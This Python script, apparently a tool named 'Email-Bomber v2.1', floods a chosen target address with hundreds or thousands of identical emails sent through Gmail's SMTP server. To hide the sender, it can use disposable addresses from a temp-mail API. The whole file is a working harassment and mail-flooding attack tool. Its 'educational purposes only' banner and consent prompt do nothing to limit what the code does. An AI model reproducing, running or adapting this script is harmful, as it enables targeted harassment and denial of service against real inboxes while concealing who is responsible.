import smtplib
import sys
import time
import logging
import getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import csv
import requests


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v2.1 with Temp Mail API ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ Ethical Use Only ]+]+]+')
    print(bcolors.GREEN + ''' 
                     __====-_  _-====___
               _--^^^#####//      \\#####^^^--_
            _-^##########// (    ) \\##########^-_
           -############//  |\^^/|  \\############-
         _/############//   (@::@)   \\############\_
        /#############((     \\//     ))#############\
       -###############\\    (oo)    //###############-
      -#################\\  / UUU \  //#################-
     -###################\\/  (   )  \/###################-
    _/|##########/\######(   /     \   )######/\##########|\_
   |/ |#/\#/\#/\/  \#/\##\  (       )  /##/\#/  \/\#/\#/\| \
   (  |/  V  |/     |/   |  \     /  |   \|/     |/   V  |  )
    \|/  V   |     /     |  |   |  |     \|     |     V   |/
       |    |    /      |   |   |   |     |      |    |    |
       |    |   |       |   |   |   |     |       |   |    |
       |    |   |       |   |   |   |     |       |   |    |

                E M A I L   B O M B E R        BY:- ROTATOR12
''')
    print(bcolors.GREEN + '"This script is for educational purposes only."')


def disclaimer():
    print(bcolors.RED + "\nThis script is for educational purposes only. Unauthorized use is prohibited.")
    consent = input(bcolors.YELLOW + "Do you agree to use this ethically? (yes/no): ")
    if consent.lower() != 'yes':
        print("Exiting program.")
        sys.exit(0)


class TempMailAPI:
    def __init__(self):
        self.base_url = "https://api.temp-mail.org/request/"
        self.api_key = None
        self.temp_email = None

    def set_api_key(self):
        self.api_key = input("Enter your Temp Mail API Key: ").strip()
        print("Checking API key validity...")
        if self.check_api_key():
            print(bcolors.GREEN + "API Key is working!")
        else:
            print(bcolors.RED + "Invalid API Key. Please try again.")
            sys.exit(1)

    def check_api_key(self):
        url = f"{self.base_url}domains/"
        headers = {"Authorization": f"Bearer {self.api_key}"}
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                return True
            else:
                print(f"Error: {response.status_code} - {response.text}")
                return False
        except requests.RequestException as e:
            print(f"Error: {e}")
            return False

    def get_temp_email(self):
        url = f"{self.base_url}mail/id/"
        headers = {"Authorization": f"Bearer {self.api_key}"}
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                self.temp_email = response.json()["email"]
                print(bcolors.GREEN + f"Temporary email generated: {self.temp_email}")
            else:
                print(f"Error: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            print(f"Error: {e}")


class EmailBomber:
    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = input(bcolors.GREEN + 'Enter target email <: ')
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if self.mode > 4 or self.mode < 1:
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def setup_bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def setup_email(self, temp_mail_api=None):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.fromAddr = None
            self.fromPwd = None

            use_temp = input(bcolors.YELLOW + "Do you want to use a temporary email via API? (yes/no): ").lower()
            if use_temp == "yes" and temp_mail_api:
                temp_mail_api.get_temp_email()
                self.fromAddr = temp_mail_api.temp_email
                self.fromPwd = None  # No password needed for temp mail
            else:
                use_personal = input(bcolors.YELLOW + "Do you want to use your personal email address? (yes/no): ").lower()
                if use_personal == "yes":
                    self.fromAddr = input(bcolors.GREEN + 'Enter your email address <: ')
                    self.fromPwd = getpass.getpass(bcolors.GREEN + 'Enter your email password <: ')

            self.subject = input(bcolors.GREEN + 'Enter subject <: ')
            self.message = input(bcolors.GREEN + 'Enter message <: ')

            # Optional: Attachments
            attach_option = input(bcolors.YELLOW + 'Do you want to add an attachment? (yes/no): ')
            if attach_option.lower() == 'yes':
                filename = input(bcolors.GREEN + 'Enter the file path to attach: ')
                self.attachment = filename
            else:
                self.attachment = None

            self.msg = MIMEMultipart()
            self.msg['From'] = self.fromAddr
            self.msg['To'] = self.target
            self.msg['Subject'] = self.subject
            self.msg.attach(MIMEText(self.message, 'plain'))

            if self.attachment:
                part = MIMEBase('application', 'octet-stream')
                with open(self.attachment, 'rb') as file:
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={self.attachment}")
                self.msg.attach(part)

            self.s = smtplib.SMTP("smtp.gmail.com", 587)  # Default Gmail SMTP server
            self.s.ehlo()
            self.s.starttls()
            if self.fromPwd:  # Login only if a password is provided
                self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send_email(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg.as_string())
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def start_attack(self):
        print(bcolors.RED + '\n+[+[+[ Starting Attack... ]+]+]+')
        self.count = 0
        for _ in range(self.amount):
            self.send_email()
            time.sleep(1)  # Rate limiting: 1 second delay between emails
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')


if __name__ == '__main__':
    banner()
    disclaimer()

    # Ask if the user wants to use the API or personal email first
    choice = input(bcolors.YELLOW + "Do you want to use the Temp Mail API for temporary email? (yes/no): ").lower()
    
    if choice == "yes":
        # Initialize Temp Mail API
        temp_mail = TempMailAPI()
        temp_mail.set_api_key()
    else:
        temp_mail = None  # No API, use personal email

    bomber = EmailBomber()
    bomber.setup_bomb()
    bomber.setup_email(temp_mail)
    bomber.start_attack()
